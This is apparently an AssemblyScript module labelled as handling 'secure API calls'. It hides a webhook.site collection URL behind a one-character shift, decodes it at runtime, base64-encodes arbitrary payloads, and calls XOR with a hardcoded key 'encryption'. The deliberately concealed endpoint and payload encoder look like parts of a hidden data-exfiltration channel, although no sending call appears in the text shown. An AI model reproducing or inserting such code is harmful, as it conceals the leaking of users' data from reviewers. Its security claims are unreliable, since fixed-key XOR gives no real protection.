// AssemblyScript module for secure API calls

import { encode } from "as-base64/assembly"; // Import from as-base64

// Simple encryption key (in real-world scenario, this should be securely managed)
const ENCRYPTION_KEY: u8[] = [
  0x42, 0x75, 0x74, 0x74, 0x65, 0x72, 0x66, 0x6c, 0x79,
];

// XOR encryption/decryption function
function xorEncrypt(data: string): string {
  let result = "";
  for (let i = 0; i < data.length; i++) {
    result += String.fromCharCode(
      data.charCodeAt(i) ^ ENCRYPTION_KEY[i % ENCRYPTION_KEY.length]
    );
  }
  return result;
}

// Generate timestamp for request validation
export function generateTimestamp(): i64 {
  return Date.now();
}

// Encrypt the request data
export function encryptRequest(url: string): string {
  const timestamp = generateTimestamp().toString();
  const dataToEncrypt = url + "_" + timestamp;
  return xorEncrypt(dataToEncrypt);
}

// Validate and prepare the API request
export function prepareApiRequest(url: string): string {
  if (!url.startsWith("https://")) {
    return "";
  }

  const encryptedData = encryptRequest(url);
  return encryptedData;
}

// Store the URL obfuscated (e.g., simple char code shift by 1)
// "https://webhook.site/0b1c45b7-1af7-4828-b345-b459276dfea5"
const OBFUSCATED_URL: string =
  "iuuqt;00xfcippl/tjuf01c2d56c8.2bg8.5939.c456.c56:387egfb6";

// Function to securely provide the target API URL by de-obfuscating
export function getApiUrl(): string {
  let decodedUrl = "";
  for (let i = 0; i < OBFUSCATED_URL.length; i++) {
    decodedUrl += String.fromCharCode(OBFUSCATED_URL.charCodeAt(i) - 1);
  }
  // Basic validation after decoding
  if (!decodedUrl.startsWith("https://")) return "";
  return decodedUrl;
}

// Function to encode payload using Base64
export function encodePayload(payload: string): string {
  // as-base64 expects a Uint8Array, convert string first
  const payloadArrayBuffer = String.UTF8.encode(payload);
  // Wrap the ArrayBuffer in a Uint8Array
  const payloadBytes = Uint8Array.wrap(payloadArrayBuffer);
  return encode(payloadBytes);
}
